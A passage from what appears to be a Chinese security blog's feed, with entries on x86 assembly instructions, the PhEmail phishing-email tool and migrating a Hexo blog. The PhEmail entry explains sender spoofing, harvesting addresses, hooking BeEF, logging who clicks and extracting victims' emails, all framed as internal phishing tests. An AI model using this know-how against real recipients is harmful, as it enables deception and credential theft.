title="mul指令"></a>mul指令</h2><p>乘法指令：</p><ol><li>两个相乘的数，要么都是8位，要么都是16位。若为8位，一个默认放在AH中，另一个放在8位寄存器或内存字节单元中；若为16位，一个默认放在AX中，另一个放在16位寄存器或内存字节单元中。</li><li>结果：若是8位乘法，结果默认放在AX中；若是16位，结果高位默认放在DX中，低位在AX中。</li></ol><h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><h3 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h3><p>offset：取得标号的偏移地址<br>mov ax,offset start相当与mov ax,0;start为代码段中的标号，所标记的指令为代码中的第一条指令，偏移地址为0。</p><h3 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h3><p>jmp为无条件转移指令。可以只修改IP，也可同时修改CS和IP。<br>jmp short 标号（转到标号处执行指令）<br>“jmp short 标号”功能：(IP)=(IP)+8位位移。<br>“jmp near ptr 标号”功能：(IP)=(IP)+16。<br>“jmp far ptr 标号”实现段间转移，又称远转移。功能：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址。</p><h3 id="Jxx"><a href="#Jxx" class="headerlink" title="Jxx"></a>Jxx</h3><p>功能: 当特定条件成立则跳往指定地址执行<br>语法: JXX 地址<br>注:<br>A: ABOVE,当C=0,Z=0时成立<br>B: BELOW,当C=1时成立<br>C: CARRY,当弁时成立 CXZ: CX寄存器的值为0(ZERO)时成立<br>E: EQUAL,当Z=1时成立<br>G: GREATER(大于),当Z=0且S=0时成立<br>L: LESS(小于),当S不为零时成立<br>N: NOT(相反条件),需和其它符号配合使用<br>O: OVERFLOW,O=1时成立<br>P: PARITY,P=1时成立<br>PE: PARITY EVEN,P=1时成立<br>PO: PARITY ODD,P=0时成立<br>S: SIGN,S=1时成立<br>Z: ZERO,Z=1时成立<br>jcxz：有条件转移指令且为短转移，指令格式：jcxz 标号（如果(cx)=0，转移到标号处执行）。当(cx)!=0时，什么都不做（程序向下执行）。<br>“jcxz 标号”功能相当于if((cx)==0)jmp short 标号；</p><h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h3><p>loop为循环控制指令，loop指令格式：loop 标号；CPU执行loop指令时，进行两步操作：</p><ol><li>cx值=cx值-1；</li><li>判断cx中的值，不为0则跳转至标号处执行程序，如果为0则向下执行。</li></ol><h3 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h3><p>ret指令用栈中数据修改IP的内容，从而实现近转移，相当与pop IP。<br>retf指令用栈中数据修改CS和IP的内容，从而实现远转移，相当于pop IP后在pop CS。</p><h3 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h3><p>call指令进行两步操作：</p><ol><li>将当前的IP或CS和IP压入栈中；</li><li>转移。<br>call指令不能实现短转移。执行call相当于执行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure></li></ol><p>转移的目的地址在指令中的call指令，”call far ptr 标号”实现段间转移，相当于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure></p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="https://blog.csdn.net/qq_33733970/article/details/78572733" target="_blank" rel="noopener">常用的汇编指令</a></p><h2 id="指令大全"><a href="#指令大全" class="headerlink" title="指令大全"></a>指令大全</h2><p><img src="/2018/09/05/汇编指令/汇编指令大全.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;数据定义&quot;&gt;&lt;a href=&quot;#数据定义&quot; class=&quot;headerlink&quot; title=&quot;数据定义&quot;&gt;&lt;/a&gt;数据定义&lt;/h2&gt;&lt;p&gt;db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1&lt;br&gt;dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2&lt;br&gt;dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4&lt;br&gt;dup操作符用来进行数据的重复：&lt;br&gt;db 重复的次数 dup (重复的字节型数据)。&lt;br&gt;dw 重复的次数 dup (重复的字型数据)。&lt;br&gt;dd 重复的次数 dup (重复的双字数据)。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="https://fl4g.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="汇编指令" scheme="https://fl4g.cn/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>PhEmail:邮件钓鱼测试工具实际使用踩过的坑</title>
    <link href="https://fl4g.cn/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
    <id>https://fl4g.cn/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/</id>
    <published>2018-08-15T01:40:30.000Z</published>
    <updated>2020-09-02T07:53:18.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PhEmail简介"><a href="#PhEmail简介" class="headerlink" title="PhEmail简介"></a>PhEmail简介</h2><p>PhEmail是基于python编写的一款网络钓鱼邮件测试工具。PhEmail可以同时向多个用户发送钓鱼邮件，并记录点击的用户的邮箱和IP等信息。PhEmail可以通过Google收集邮箱，完成邮箱收集工作。该工具可以用于公司内部邮箱钓鱼测试，可结合beef使用。</p><p><strong>PhEmail项目主页：</strong><br><a href="https://github.com/Dionach/PhEmail" target="_blank" rel="noopener">PhEmail钓鱼邮件工具</a><br><a id="more"></a></p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="PhEmail帮助"><a href="#PhEmail帮助" class="headerlink" title="PhEmail帮助"></a>PhEmail帮助</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PHishing EMAIL tool v0<span class="number">.13</span></span><br><span class="line">Usage: phemail.py [-e &lt;emails&gt;] [-m &lt;mail_server&gt;] [-f &lt;from_address&gt;] [-r &lt;replay_address&gt;] [-s &lt;subject&gt;] [-b &lt;body&gt;]</span><br><span class="line">          -e    emails: File containing list of emails (Default: emails.txt)</span><br><span class="line">          -f    from_address: Source email address displayed <span class="keyword">in</span> FROM field of the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -r    reply_address: Actual email address used to send the emails <span class="keyword">in</span> case that people reply to the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -s    subject: Subject of the email (Default: Newsletter)</span><br><span class="line">          -b    body: Body of the email (Default: body.txt)</span><br><span class="line">          -p    pages: Specifies number of results pages searched (Default: <span class="number">10</span> pages)</span><br><span class="line">          -v    verbose: Verbose Mode (Default: false)</span><br><span class="line">          -l    layout: Send email <span class="keyword">with</span> no embedded pictures</span><br><span class="line">          -B    BeEF: Add the hook <span class="keyword">for</span> BeEF</span><br><span class="line">          -m    mail_server: SMTP mail server to connect to</span><br><span class="line">          -g    Google: Use a google account username:password</span><br><span class="line">          -t    Time delay: Add deleay between each email (Default: <span class="number">3</span> sec)</span><br><span class="line">          -L    webserverLog: Customise the name of the webserver log file (Default: Date time <span class="keyword">in</span> format <span class="string">"%d_%m_%Y_%H_%M"</span>)</span><br><span class="line">          -S    Search: query on Google</span><br><span class="line">          -d    domain: of email addresses</span><br><span class="line">          -n    number: of emails per connection (Default: <span class="number">10</span> emails)</span><br><span class="line">          -c    clone: Clone a web page</span><br><span class="line">          -w    website: where the phishing email link points to</span><br><span class="line">          -o    save output <span class="keyword">in</span> a file</span><br><span class="line">          -F    Format (Default: <span class="number">0</span>):</span><br><span class="line">                <span class="number">0</span>- firstname surname</span><br><span class="line">                <span class="number">1</span>- firstname.surname@example.com</span><br><span class="line">                <span class="number">2</span>- firstnamesurname@example.com</span><br><span class="line">                <span class="number">3</span>- f.surname@example.com</span><br><span class="line">                <span class="number">4</span>- firstname.s@example.com</span><br><span class="line">                <span class="number">5</span>- surname.firstname@example.com</span><br><span class="line">                <span class="number">6</span>- s.firstname@example.com</span><br><span class="line">                <span class="number">7</span>- surname.f@example.com</span><br><span class="line">                <span class="number">8</span>- surnamefirstname@example.com</span><br><span class="line">                <span class="number">9</span>- firstname_surname@example.com</span><br><span class="line"></span><br><span class="line">Examples: phemail.py -e emails.txt -f <span class="string">"Name Surname &lt;name_surname@example.com&gt;"</span> -r <span class="string">"Name Surname &lt;name_surname@example.com&gt;"</span> -s <span class="string">"Subject"</span> -b body.txt</span><br><span class="line">          phemail.py -S example -d example.com -F <span class="number">1</span> -p <span class="number">12</span></span><br><span class="line">          phemail.py -c https://example.com</span><br></pre></td></tr></table></figure><p>收集邮箱后钓鱼邮件发送常用参数：</p><ul><li>-e 收件人邮箱列表（列表内邮箱必须为同一域名）</li><li>-f 发件人邮箱地址（伪造的邮箱不能与收件人邮箱在同一域名下）</li><li>-r 收件人回复邮件时的接收邮箱，可采用临时邮箱</li><li>-s 伪造的邮件主题</li><li>-b 伪造的邮件内容文件，采用html编码，模板中采用href=”{0}”来代替url地址</li><li>-w 钓鱼网站url地址，发送后会自动添加index.php?email=等内容</li></ul><h3 id="记录邮箱的方式"><a href="#记录邮箱的方式" class="headerlink" title="记录邮箱的方式"></a>记录邮箱的方式</h3><p>钓鱼邮件中的url链接伪造时添加email地址并进行编码，通过钓鱼网站中php文件代码来识别email并记录log文件中。php可以进行重定向到其他网站。</p><h2 id="实际使用需要修改的地方"><a href="#实际使用需要修改的地方" class="headerlink" title="实际使用需要修改的地方"></a>实际使用需要修改的地方</h2><h3 id="BeautifulSoup问题"><a href="#BeautifulSoup问题" class="headerlink" title="BeautifulSoup问题"></a>BeautifulSoup问题</h3><p>安装BeautifulSoup后，运行程序时会报BeautifulSoup问题。</p><ol><li><p>可以将源代码中如下位置的注释切换<br><img src="/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/beautifulsoup4.PNG" alt=""><br>修改为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">    <span class="comment">#from bs4 import BeautifulSoup</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"No BeautifulSoup installed"</span></span><br></pre></td></tr></table></figure></li><li><p>不修改注释，将所有调用BeautufulSoup的函数的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = BeautifulSoup(xxx)</span><br></pre></td></tr></table></figure></li></ol><p>修改为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = BeautifulSoup(xxx,<span class="string">'lxml'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>邮件在使用中文时出现中文乱码，需要修改phemail.py内容进行调整。</p><h4 id="邮件标题乱码"><a href="#邮件标题乱码" class="headerlink" title="邮件标题乱码"></a>邮件标题乱码</h4><p>在导入包时添加如下内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure></p><p>对邮件标题进行unicode编码，在发送邮件时添加如下代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(SUBJECT):</span><br><span class="line">      SUBJECT = unicode(SUBJECT,unicode)</span><br><span class="line">msg[<span class="string">'subject'</span>] = SUBJECT</span><br></pre></td></tr></table></figure></p><h4 id="邮件内容乱码"><a href="#邮件内容乱码" class="headerlink" title="邮件内容乱码"></a>邮件内容乱码</h4><p>添加如下代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg[<span class="string">"Accept-Language"</span>]=<span class="string">"zh-CN"</span></span><br><span class="line">msg[<span class="string">"Accept-Charset"</span>]=<span class="string">"ISO-8859-1,utf-8"</span></span><br></pre></td></tr></table></figure></p><p>并将<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">'html'</span>))</span><br></pre></td></tr></table></figure></p><p>修改为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">'html'</span>,<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><h3 id="index-php内容修改"><a href="#index-php内容修改" class="headerlink" title="index.php内容修改"></a>index.php内容修改</h3><h4 id="修改域名"><a href="#修改域名" class="headerlink" title="修改域名"></a>修改域名</h4><p>修改位置在index.php中有提示：<br><img src="/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/change_domain.PNG" alt=""><br>将其中的dionach.com修改为收件人邮箱的域名。</p><h4 id="修改重定向"><a href="#修改重定向" class="headerlink" title="修改重定向"></a>修改重定向</h4><p>在index.php末尾存在重定向方法，可以将此url改为你想要重定向的url，如<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br><img src="/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/重定向.PNG" alt=""></p><h4 id="修改记录log文件保存位置"><a href="#修改记录log文件保存位置" class="headerlink" title="修改记录log文件保存位置"></a>修改记录log文件保存位置</h4><p>index.php中将log文件保存在/tmp目录中，若使用windows搭建网站服务，则不存在/tmp目录,直接将log文件保存在当前目录，删除下面代码中的”/tmp/“<br><img src="/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/log文件位置.PNG" alt=""></p><h2 id="整理log日志"><a href="#整理log日志" class="headerlink" title="整理log日志"></a>整理log日志</h2><p>若收件人点击后php获取了如下一系列信息：<br><img src="/2018/08/15/PhEmail-邮件钓鱼测试工具实际使用踩过的坑/log信息.PNG" alt=""><br>若存在多个文件，并想提取其中的email地址，并去重，于是写了一个小脚本进行提取email去重：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r"([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)"</span></span><br><span class="line"></span><br><span class="line">filepth = sys.argv[<span class="number">1</span>]</span><br><span class="line">file = os.listdir(filepth)</span><br><span class="line">allinemail = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">with</span> open(filepth+filename,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        emails = re.findall(regex,f.read())</span><br><span class="line">        allemail = list(set(emails))</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> allemail:</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> allinemail:</span><br><span class="line">                allinemail.append(e)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'email_result.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> w:</span><br><span class="line">    <span class="keyword">for</span> email <span class="keyword">in</span> allinemail:</span><br><span class="line">        w.write(email+<span class="string">'\n'</span>)</span><br><span class="line">w.close()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PhEmail简介&quot;&gt;&lt;a href=&quot;#PhEmail简介&quot; class=&quot;headerlink&quot; title=&quot;PhEmail简介&quot;&gt;&lt;/a&gt;PhEmail简介&lt;/h2&gt;&lt;p&gt;PhEmail是基于python编写的一款网络钓鱼邮件测试工具。PhEmail可以同时向多个用户发送钓鱼邮件，并记录点击的用户的邮箱和IP等信息。PhEmail可以通过Google收集邮箱，完成邮箱收集工作。该工具可以用于公司内部邮箱钓鱼测试，可结合beef使用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PhEmail项目主页：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/Dionach/PhEmail&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PhEmail钓鱼邮件工具&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="PhEmail" scheme="https://fl4g.cn/tags/PhEmail/"/>
    
      <category term="邮件钓鱼" scheme="https://fl4g.cn/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客迁移到其他电脑</title>
    <link href="https://fl4g.cn/2018/08/03/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%B5%E8%84%91/"/>
    <id>https://fl4g.cn/2018/08/03/Hexo博客迁移到其他电脑/</id>
    <published>2018-08-03T06:14:00.000Z</published>
    <updated>2020-09-03T16:04:55.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id="备份原文件"><a href="#备份原文件" class="headerlink" title="备份原文件"></a>备份原文件</h2><p>需要转移的文件有：</p><table><thead><tr><th>文件(夹)</th><th>说明</th></tr></thead><tbody><tr><td>scaffolds/</td><td>博客文章模板</td></tr><tr><td>source/</td><td>所有的博客文章</td></tr><tr><td>themes/</td><td>网站主题</td></tr><tr><td>.gitignore</td><td>push时需忽略的文件</td></tr><tr><td>_config.yml</td><td>站点配置文件</td></tr><tr><td>package.json</td><td>依赖包的名称和版本号</td></tr></tbody></table><p>由于配置文件和主题文件需要经常更改，采用github创建博客分支的方式进行备份。</p><a id="more"></a><h2 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h2><p>克隆github上上生成的静态文件到hexo文件夹中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yourname/xxxx.github.io.git hexo</span><br></pre></td></tr></table></figure></p><p>克隆后将除.git文件外其他所有文件删除。主要是为了得到版本管理文件夹.git。<br><strong>.git文件为隐藏文件，可直接将可见文件全部删除</strong></p><p>将备份的原文件复制到此文件夹。若文件夹是从github克隆，则需要删除主题文件中的版本控制文件夹,以next主题为例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -rf thems/next/.git*</span><br></pre></td></tr></table></figure></p><p>创建名为hexo的分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b hexo</span><br></pre></td></tr></table></figure></p><p>保存所有文件到暂存区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add --all</span><br></pre></td></tr></table></figure></p><p>提交变更<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m <span class="string">"hexo-2"</span></span><br></pre></td></tr></table></figure></p><p>提交变更时报错：<br><img src="/2018/08/03/Hexo博客迁移到其他电脑/git_config.png" alt=""><br>根据提示配置。</p><p>推送分支到github,并用–set-upstream与origin创建关联，将hexo设置为默认分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push --<span class="built_in">set</span>-upstream origin hexo</span><br></pre></td></tr></table></figure></p><hr><h1 id="迁移工作："><a href="#迁移工作：" class="headerlink" title="迁移工作："></a>迁移工作：</h1><h2 id="安装hexo博客必要的软件"><a href="#安装hexo博客必要的软件" class="headerlink" title="安装hexo博客必要的软件"></a>安装hexo博客必要的软件</h2><p>下载安装Git客户端</p><p>安装node js</p><p>安装hexo，并进行hexo init初始化设置。hexo init后文件可以全部删除。</p><h2 id="git下载备份的博客文件"><a href="#git下载备份的博客文件" class="headerlink" title="git下载备份的博客文件"></a>git下载备份的博客文件</h2><p>克隆github上上生成的静态文件到文件夹中（主分支中的文件）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yourname/xxxx.github.io.git</span><br></pre></td></tr></table></figure><p>克隆后将除.git文件外其他所有文件删除。主要是为了得到版本管理文件夹.git。<br><strong>.git文件为隐藏文件，可直接将可见文件全部删除</strong></p><p>直接将分支克隆下来，替换除了.git的所有文件，即将所有可见文件复制到已删除所有可见文件的文件夹。再使用npm install安装依赖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone -b hexo https://github.com/yourname/xxx.github.io.git</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>## </p><h2 id="Github添加新电脑生成的密钥"><a href="#Github添加新电脑生成的密钥" class="headerlink" title="Github添加新电脑生成的密钥"></a>Github添加新电脑生成的密钥</h2><p>打开git bash输入如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"xxxxx@163.com"</span></span><br></pre></td></tr></table></figure><p>邮箱为GitHub注册邮箱，输入命令后直接回车，生成密钥对。根据提示找到密钥对所在位置，将id_rsa.pub公钥内容复制粘贴到Github-settings-‘SSH and GPG keys’-‘SSH keys’中。<br>使用<code>ssh -T git@github.com</code>测试公钥是否添加成功<br><img src="/2018/08/03/Hexo博客迁移到其他电脑/公钥测试.png" alt=""></p><h2 id="设置个人信息"><a href="#设置个人信息" class="headerlink" title="设置个人信息"></a>设置个人信息</h2><p>使用<code>git config -l</code>来查看是否设置了个人信息，若未设置，则进行如下设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;yourname”</span><br><span class="line">$ git config --global user.email youremail@example.com</span><br></pre></td></tr></table></figure><h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><p>新建文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;xxx&quot;</span><br></pre></td></tr></table></figure></p><p>注意：需要使用git push把源文件推到分支上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;xxxx&quot;</span><br><span class="line">$ git push origin hexo</span><br></pre></td></tr></table></figure></p><p>部署文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d -g</span><br></pre></td></tr></table></figure><p>## </p><h2 id="常见报错解决："><a href="#常见报错解决：" class="headerlink" title="常见报错解决："></a>常见报错解决：</h2><ul><li>部署时，若报如下错</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error: 源引用表达式 hexo 没有匹配</span><br><span class="line">error: 推送一些引用到 <span class="string">'https://github.com/zeringzxh/zeringzxh.github.io.git'</span> 失败</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b hexo</span><br></pre></td></tr></table></figure><p>来切换分支，此时还是会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error: 推送一些引用到 &apos;https://github.com/zeringzxh/zeringzxh.github.io.git&apos; 失败</span><br><span class="line"></span><br><span class="line">提示：更新被拒绝，因为您当前分支的最新提交落后于其对应的远程分支。</span><br><span class="line"></span><br><span class="line">提示：再次推送前，先与远程变更合并（如 &apos;git pull ...&apos;）。详见</span><br><span class="line"></span><br><span class="line">提示：&apos;git push --help&apos; 中的 &apos;Note about fast-forwards&apos; 小节</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin +hexo</span><br></pre></td></tr></table></figure><ul><li>若报如下错</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FATAL Something&apos;s wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.html</span><br><span class="line">TypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Object</span><br><span class="line">    at copyFile (fs.js:1924:10)</span><br><span class="line">    at tryCatcher (/Users/zering/hexo/node_modules/bluebird/js/release/util.js:16:23)</span><br><span class="line">    at ret (eval at makeNodePromisifiedEval (/usr/local/lib/node_modules/hexo/node_modules/bluebird/js/release/promisify.js:184:12), &lt;anonymous&gt;:13:39)</span><br><span class="line">    at /Users/zering/hexo/node_modules/hexo-fs/lib/fs.js:181:12</span><br><span class="line">    at tryCatcher (/Users/zering/hexo/node_modules/bluebird/js/release/util.js:16:23)</span><br><span class="line">    at Promise._settlePromiseFromHandler (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:512:31)</span><br><span class="line">    at Promise._settlePromise (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:638:18)</span><br><span class="line">    at Promise._resolveCallback (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:432:57)</span><br><span class="line">    at Promise._settlePromiseFromHandler (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:524:17)</span><br><span class="line">    at Promise._settlePromise (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises 